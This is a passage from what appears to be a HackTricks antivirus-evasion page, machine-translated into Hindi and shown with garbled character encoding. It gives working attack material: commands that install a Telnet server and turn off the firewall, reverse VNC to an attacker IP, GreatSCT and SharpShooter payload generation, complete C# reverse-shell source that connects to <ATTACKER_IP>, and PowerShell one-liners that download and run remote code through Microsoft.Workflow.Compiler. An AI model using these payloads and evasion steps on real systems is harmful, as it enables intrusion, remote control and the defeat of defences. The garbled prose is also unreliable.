рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ post-exploitation рджреБрд░реБрдкрдпреЛрдЧреА рдХреЛрдб рдХреЛ **рдЕрдкрдиреА рдЦреБрдж рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ** рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдирд╛ред рдЗрд╕ рддрд░реАрдХреЗ рд╕реЗ, рдЖрдкрдХреЛ рдПрдХ рдирдИ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдмрдирд╛рдиреЗ рдФрд░ рдЙрд╕реЗ AV рджреНрд╡рд╛рд░рд╛ рд╕реНрдХреИрди рдХрд░рд╡рд╛рдиреЗ рд╕реЗ рдмрдЪрдиреЗ рдореЗрдВ рдорджрдж рдорд┐рд▓рддреА рд╣реИ, рд▓реЗрдХрд┐рди рдиреБрдХрд╕рд╛рди рдпрд╣ рд╣реИ рдХрд┐ рдпрджрд┐ рдЖрдкрдХреЗ payload рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рдореЗрдВ рдХреБрдЫ рдЧрд▓рдд рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЖрдкрдХреЗ рдмреАрдХрди рдХреЛ рдЦреЛрдиреЗ рдХреА **рдЕрдзрд┐рдХ рд╕рдВрднрд╛рд╡рдирд╛** рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдХреНрд░реИрд╢ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

<figure><img src="../.gitbook/assets/image (9) (3) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
рдпрджрд┐ рдЖрдк C# Assembly рд▓реЛрдбрд┐рдВрдЧ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдФрд░ рдЕрдзрд┐рдХ рдкрдврд╝рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ рдХреГрдкрдпрд╛ рдЗрд╕ рд▓реЗрдЦ [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) рдФрд░ рдЙрдирдХреЗ InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВред
{% endhint %}

рдЖрдк C# Assemblies **PowerShell рд╕реЗ** рднреА рд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) рдФрд░ [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk) рджреЗрдЦреЗрдВред

## рдЕрдиреНрдп рдкреНрд░реЛрдЧреНрд░рд╛рдорд┐рдВрдЧ рднрд╛рд╖рд╛рдУрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) рдореЗрдВ рдкреНрд░рд╕реНрддрд╛рд╡рд┐рдд рд╣реИ рдХрд┐ рдЖрдХреНрд░рдорд┐рдд рдорд╢реАрди рдХреЛ рдЖрдХреНрд░рдордХ рдХреЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдХреНрд░рдордХ рд╡рд╛рддрд╛рд╡рд░рдг рдкрд░рд┐рдпреЛрдЬрд┐рдд SMB рд╕рд╛рдЭрд╛ рдкрд░ рдЗрдВрдЯрд░рдкреНрд░реАрдЯрд░ рд╡рд╛рддрд╛рд╡рд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдиреНрдп рднрд╛рд╖рд╛рдУрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред

рдЗрдВрдЯрд░рдкреНрд░реАрдЯрд░ рдмрд╛рдЗрдирд░реАрдЬрд╝ рдФрд░ SMB рд╕рд╛рдЭрд╛ рдкрд░рд┐рдпреЛрдЬрд┐рдд рд╡рд╛рддрд╛рд╡рд░рдг рдХрд╛ рдкрд╣реБрдВрдЪ рджреЗрдиреЗ рджреНрд╡рд╛рд░рд╛ рдЖрдк рдЖрдХреНрд░рдорд┐рдд рдорд╢реАрди рдХреА рдореЗрдореЛрд░реА рдореЗрдВ рдЗрди рднрд╛рд╖рд╛рдУрдВ рдореЗрдВ рд╡рд┐рдЪрд╛рд░рд╣реАрди рдХреЛрдб рдХреЛ **рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рд░реЗрдкреЛ рдЗрд╕рдХрд╛ рд╕реБрдЭрд╛рд╡ рджреЗрддрд╛ рд╣реИ: Defender рдЕрдм рднреА рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рд╕реНрдХреИрди рдХрд░рддрд╛ рд╣реИ рд▓реЗрдХрд┐рди Go, Java, PHP рдЖрджрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣рдореЗрдВ **рд╕реНрдерд┐рд░ рд╣рд╕реНрддрд╛рдХреНрд╖рд░реЛрдВ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ** рдХреА **рдЕрдзрд┐рдХрддрд╛** рд╣реИред рдЗрди рднрд╛рд╖рд╛рдУрдВ рдореЗрдВ рдЕрдирд┐рдпрдВрддреНрд░рд┐рдд рд░рд┐рд╡рд░реНрд╕ рд╢реИрд▓ рд╡рд╛рд▓реЗ рдЕрджреНрд╡рд┐рддреАрдп рд╢реИрд▓реА рдХреЗ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рд╕рд╛рде рдкрд░реАрдХреНрд╖рдг рд╕рдлрд▓ рд╕рд╛рдмрд┐рдд рд╣реБрдЖ рд╣реИред

## рдЙрдиреНрдирдд рдЯрд╛рд▓рдирд╛

рдЯрд╛рд▓рдирд╛ рдПрдХ рдмрд╣реБрдд рдЬрдЯрд┐рд▓ рд╡рд┐рд╖рдп рд╣реИ, рдХрднреА-рдХрднреА рдЖрдкрдХреЛ рдПрдХ рд╣реА рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдХрдИ рд╡рд┐рднрд┐рдиреНрди рддреЗрд▓реАрдореЗрдЯреНрд░реА рд╕реНрд░реЛрддреЛрдВ рдХреЛ рдзреНрдпрд╛рди рдореЗрдВ рд░рдЦрдирд╛ рд╣реЛрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдкрд░рд┐рдкрдХреНрд╡ рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдЕрдирдкреНрд░рдХрдЯ рд░рд╣рдирд╛ рд▓рдЧрднрдЧ рдЕрд╕рдВрднрд╡ рд╣реИред

рдЬрд┐рд╕ рднреА рд╡рд╛рддрд╛рд╡рд░рдг рдХреЗ рдЦрд┐рд▓рд╛рдл рдЖрдк рдЬрд╛рддреЗ рд╣реИрдВ, рдЙрд╕рдХреЗ рдЕрдкрдиреЗ рд╢рдХреНрддрд┐рдпреЛрдВ рдФрд░ рдХрдордЬреЛрд░рд┐рдпреЛрдВ рд╣реЛрддреЗ рд╣реИрдВред

рдореИрдВ рдЖрдкрдХреЛ рдЙрдиреНрдирдд рдЯрд╛рд▓рди рддрдХрдиреАрдХреЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕ рдЯреЙрдХ рдХреЛ рджреЗрдЦрдиреЗ рдХреА рд╕рд░рд╛рд╣рдирд╛ рдХрд░рддрд╛ рд╣реВрдВ [@ATTL4S](https://twitter.com/DaniLJ94),ред

{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}

рдпрд╣ рдПрдХ рдФрд░ рд╢рд╛рдирджрд╛рд░ рдЯреЙрдХ рд╣реИ [@mariuszbit](https://twitter.com/mariuszbit) рдХреЗ рджреНрд╡рд╛рд░рд╛ рдЯрд╛рд▓рди рдореЗрдВ рдЧрд╣рд░рд╛рдИ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВред

{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}

## **рдкреБрд░рд╛рдиреА рддрдХрдиреАрдХреЗрдВ**

### **рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ Defender рдХрд┐рд╕ рд╣рд┐рд╕реНрд╕реЗ рдХреЛ рджреБрд░реБрдкрдпреЛрдЧреА рдорд╛рдирддрд╛ рд╣реИ**

рдЖрдк [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ **рдмрд╛рдЗрдирд░реА рдХреЗ рд╣рд┐рд╕реНрд╕реЗ рдХреЛ рд╣рдЯрд╛ рджреЗрдЧрд╛** рдЬрдм рддрдХ рдпрд╣ рди рдкрддрд╛ рд▓рдЧрд╛ рд▓реЗрддрд╛ рд╣реИ рдХрд┐ Defender рдХрд┐рд╕ рд╣рд┐рд╕реНрд╕реЗ рдХреЛ рджреБрд░реБрдкрдпреЛрдЧреА рдорд╛рди рд░рд╣рд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рдЖрдкрдХреЛ рд╡рд┐рднрд╛рдЬрд┐рдд рдХрд░ рджреЗрдЧрд╛ред\
рдПрдХ рдФрд░ рдЙрдкрдХрд░рдг рдЬреЛ **рдПрдХ рд╣реА рдЪреАрдЬ рдХрд░ рд░рд╣рд╛ рд╣реИ** рд╣реИ [**avred**](https://github.com/dobin/avred) рдЬрд┐рд╕рдХреЗ рдПрдХ рдУрдкрди рд╡реЗрдм рд╕реЗрд╡рд╛ рдореЗрдВ рд╕реЗрд╡рд╛ рдкреНрд░рджрд╛рди рдХрд░ рд░рд╣рд╛ рд╣реИ [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **рдЯреЗрд▓рдиреЗрдЯ рд╕рд░реНрд╡рд░**

Windows10 рддрдХ, рд╕рднреА Windows рдХреЗ рд╕рд╛рде рдПрдХ **рдЯреЗрд▓рдиреЗрдЯ рд╕рд░реНрд╡рд░** рдЖрддрд╛ рдерд╛ рдЬрд┐рд╕реЗ рдЖрдк (рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдХреЗ рд░реВрдк рдореЗрдВ) рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░ рд╕рдХрддреЗ рдереЗ:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
рдЗрд╕реЗ **рд╢реБрд░реВ** рдХрд░реЗрдВ рдЬрдм рд╕рд┐рд╕реНрдЯрдо рд╢реБрд░реВ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдЕрдм рдЗрд╕реЗ **рдЪрд▓рд╛рдПрдВ**:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**рдЯреЗрд▓рдиреЗрдЯ рдкреЛрд░реНрдЯ рдмрджрд▓реЗрдВ** (рдЫрд▓) рдФрд░ рдлрд╝рд╛рдпрд░рд╡реЙрд▓ рдЕрдХреНрд╖рдо рдХрд░реЗрдВ:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

рдЗрд╕реЗ рдпрд╣рд╛рдБ рд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (рдЖрдкрдХреЛ рд╕реЗрдЯрдЕрдк рдирд╣реАрдВ, рдмрд┐рди рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рд╣реИ)

**рдореЗрдЬрд╝рдмрд╛рди рдкрд░**: _**winvnc.exe**_ рдХреЛ рдЪрд▓рд╛рдПрдВ рдФрд░ рд╕рд░реНрд╡рд░ рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░реЗрдВ:

* _TrayIcon_ рдХреЛ рдЕрдХреНрд╖рдо рдХрд░реЗрдВ
* _VNC Password_ рдореЗрдВ рдкрд╛рд╕рд╡рд░реНрдб рд╕реЗрдЯ рдХрд░реЗрдВ
* _View-Only Password_ рдореЗрдВ рдкрд╛рд╕рд╡рд░реНрдб рд╕реЗрдЯ рдХрд░реЗрдВ

рдлрд┐рд░, рдмрд╛рдЗрдирд░реА _**winvnc.exe**_ рдФрд░ **рдирдпрд╛** рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рдлрд╝рд╛рдЗрд▓ _**UltraVNC.ini**_ рдХреЛ **рд╡рд┐рдХреНрдЯрд┐рдо** рдХреЗ рдЕрдВрджрд░ рд▓реЗ рдЬрд╛рдПрдВ

#### **рд░рд┐рд╡рд░реНрд╕ рдХрдиреЗрдХреНрд╢рди**

**рд╣рдорд▓рд╛рд╡рд░** рдХреЛ рдЕрдкрдиреЗ **рд╣реЛрд╕реНрдЯ** рдХреЗ рдЕрдВрджрд░ рдмрд╛рдЗрдирд░реА `vncviewer.exe -listen 5900` рдХреЛ **рдЪрд▓рд╛рдирд╛** рдЪрд╛рд╣рд┐рдП рддрд╛рдХрд┐ рд╡рд╣ рд░рд┐рд╡рд░реНрд╕ **VNC рдХрдиреЗрдХреНрд╢рди** рдХреЛ рдкрдХрдбрд╝рдиреЗ рдХреЗ рд▓рд┐рдП **рддреИрдпрд╛рд░** рд╣реЛ рдЬрд╛рдПред рдлрд┐рд░, **рд╡рд┐рдХреНрдЯрд┐рдо** рдХреЗ рдЕрдВрджрд░: winvnc рдбреЗрдорди рдЪрд▓рд╛рдПрдВ `winvnc.exe -run` рдФрд░ `winwnc.exe [-autoreconnect] -connect <рд╣рдорд▓рд╛рд╡рд░_ip>::5900`

**рдЪреЗрддрд╛рд╡рдиреА:** рдЧреБрдкреНрддрдЪрд░рддрд╛ рдмрдирд╛рдП рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдХреБрдЫ рдЪреАрдЬрд╝реЗрдВ рдирд╣реАрдВ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП

* рдЕрдЧрд░ рдпрд╣ рдкрд╣рд▓реЗ рд╕реЗ рдЪрд▓ рд░рд╣рд╛ рд╣реИ, рддреЛ `winvnc` рди рдЪрд▓рд╛рдПрдВ рдпрд╛ рдЖрдкрдХреЛ [рдкреЙрдкрдЕрдк](https://i.imgur.com/1SROTTl.png) рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░ рджреЗрдЧрд╛ред `tasklist | findstr winvnc` рдХреЗ рд╕рд╛рде рдЪрд▓ рд░рд╣рд╛ рд╣реИ рдпрд╛ рдирд╣реАрдВ рдпрд╣ рдЬрд╛рдВрдЪреЗрдВ
* `UltraVNC.ini` рдХреЗ рдмрд┐рдирд╛ `winvnc` рди рдЪрд▓рд╛рдПрдВ рдпрд╛ рдпрд╣ [рдХреЙрдиреНрдлрд╝рд┐рдЧ рд╡рд┐рдВрдбреЛ](https://i.imgur.com/rfMQWcf.png) рдЦреЛрд▓ рджреЗрдЧрд╛
* рдорджрдж рдХреЗ рд▓рд┐рдП `winvnc -h` рди рдЪрд▓рд╛рдПрдВ рдпрд╛ рдЖрдкрдХреЛ [рдкреЙрдкрдЕрдк](https://i.imgur.com/oc18wcu.png) рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░ рджреЗрдЧрд╛

### GreatSCT

рдЗрд╕реЗ рдпрд╣рд╛рдБ рд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT рдХреЗ рдЕрдВрджрд░:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
рдЕрдм **рд▓рд┐рд╕реНрдЯрдирд░ рдХреЛ рд╢реБрд░реВ** рдХрд░реЗрдВ `msfconsole -r file.rc` рдФрд░ **рдПрдХреНрд╕реАрдХреНрдпреВрдЯ** рдХрд░реЗрдВ **рдПрдХреНрд╕рдПрдордПрд▓ рдкреЗрд▓реЛрдб** рдХреЗ рд╕рд╛рде:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**рд╡рд░реНрддрдорд╛рди рд░рдХреНрд╖рдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдмрд╣реБрдд рддреЗрдЬреА рд╕реЗ рд╕рдорд╛рдкреНрдд рдХрд░ рджреЗрдЧрд╛ред**

### рд╣рдорд╛рд░реА рдЦреБрдж рдХреА рд░рд┐рд╡рд░реНрд╕ рд╢реИрд▓ рдХреЛ рдХрдВрдкрд╛рдЗрд▓ рдХрд░рдирд╛

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### рдкрд╣рд▓рд╛ рд╕реА# рд░рд┐рд╡рд░реНрд╕рд╢реИрд▓

рдЗрд╕реЗ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХрдВрдкрд╛рдЗрд▓ рдХрд░реЗрдВ:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Use it with:  
**рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:**
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрдВрдкрд╛рдЗрд▓рд░
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдбрд╛рдЙрдирд▓реЛрдб рдФрд░ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}

C# obfuscators list: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### рд╕реА++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
* [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
* [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
* [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
* [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
* [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### рдЕрдиреНрдп рдЙрдкрдХрд░рдг
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### рдЕрдзрд┐рдХ

* [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдореБрдЭреЗ** **Twitter** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рджреНрд╡рд╛рд░рд╛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ **HackTricks** рдФрд░ **HackTricks Cloud** github repos рдореЗрдВред

</details>
